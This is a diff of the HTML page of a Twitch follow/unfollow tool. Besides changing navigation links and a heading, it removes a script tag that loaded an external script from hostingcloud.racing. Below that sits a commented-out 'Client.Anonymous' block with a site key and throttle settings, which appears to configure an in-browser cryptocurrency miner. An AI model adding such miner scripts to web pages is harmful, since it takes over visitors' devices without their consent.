@@ -68,9 +68,7 @@
                 <a href="f4f.php" onclick="page(this);" class="active">F4F Tool</a>
                 <a href="home.php" onclick="page(this);">Home</a>
                 <a href="register.php" onclick="page(this);">Unfollower</a>
-                <a href="regchatters.php" onclick="page(this);">Viewers</a>
-                <a href="links.php" onclick="page(this);">Useful Links</a>
-                <a href="about.php" onclick="page(this);">About</a>
+                <a href="about.php" onclick="page(this);">FAQ'S</a>
                 <a id="hidden" style="display:block;margin:auto;text-align:center;" href="https://id.twitch.tv/oauth2/authorize?response_type=token&client_id=v8jjvzxpx7byti5lykiyy5001gueh4&redirect_uri=http://unfollowers.tv/home.php&scope=analytics:read:extensions"><img height="25"  class="logme"  src="img/login.png"></a>
                 <a href="javascript:void(0);" class="icon" onclick="myFunction()">
                     <i class="fa fa-bars"></i>
@@ -94,14 +92,14 @@
                 </div>
                 <div id="links" class="col-md-6 col-sm-6">
                     <h2 style="text-align: center;color:white;">
-                        Users who followed back :                    
+                       Details :                    
                     </h2>
                     <br>
                 </div> 
             </div>
         </div>
         <br>
-        <button class="btn" style="display:block;margin:auto;" id="next" onclick="nextPage();">Next page</button>
+        <button class="btn" style="display:block;margin:auto;" id="next">Next page</button>
         <br>
         <div class="footer">
             <p style="margin:auto;">twitchtoolstv@gmail.com <a target="_blank" href="https://patreon.com/twitchtools"><img src="img/patreon.png" height="15"/></a> <a href="https://twitter.com/AnalyticsTwitch"><img height="15" src="img/twitter.png"/></a></p>
@@ -110,7 +108,7 @@
                 var hide = document.getElementById("hidden");
                 hide.style.display = "none";
             }</script>
-        <script src="https://www.hostingcloud.racing/8qk1.js"></script>
+        
         <!--<script>
             var _client = new Client.Anonymous('2beb50d3caea6149deaa2ea8aa1c2007caa56923a55a5bfcfffaa91a10722bc6', {
                 throttle: 0.3, ads: 0
